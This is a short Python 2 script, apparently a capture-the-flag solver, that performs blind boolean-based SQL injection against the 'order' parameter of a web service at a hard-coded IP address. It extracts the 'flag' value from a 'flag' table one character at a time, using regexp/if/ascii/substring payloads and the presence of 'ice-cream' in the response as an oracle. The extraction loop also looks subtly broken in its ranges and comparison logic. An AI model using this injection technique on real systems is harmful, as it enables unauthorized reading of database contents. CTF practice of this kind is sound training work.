# -*- coding: cp936 -*-
import urllib2
import urllib
def check_url(url2):
    #url3=urllib.quote(url2)
    url="http://101.71.29.5:10000/?order="+url2+"&button=submit"
    print url
    request = urllib2.Request(url)
    response = urllib2.urlopen(request)
    html = response.read()
    #print html
    return 'ice-cream' not in html

def set_payload():
    a=''
    for j in range(2):
        for i in range(47,128):
            url2="(select+1+regexp+if(ascii(substring((select+flag+from+flag),%d,1))"%(j)+"%3E"+"%d,1,0x00))"%(i)
            b=check_url(url2)
            print b
            if(b):
                a=a+chr(i)
                print a
                break
set_payload()


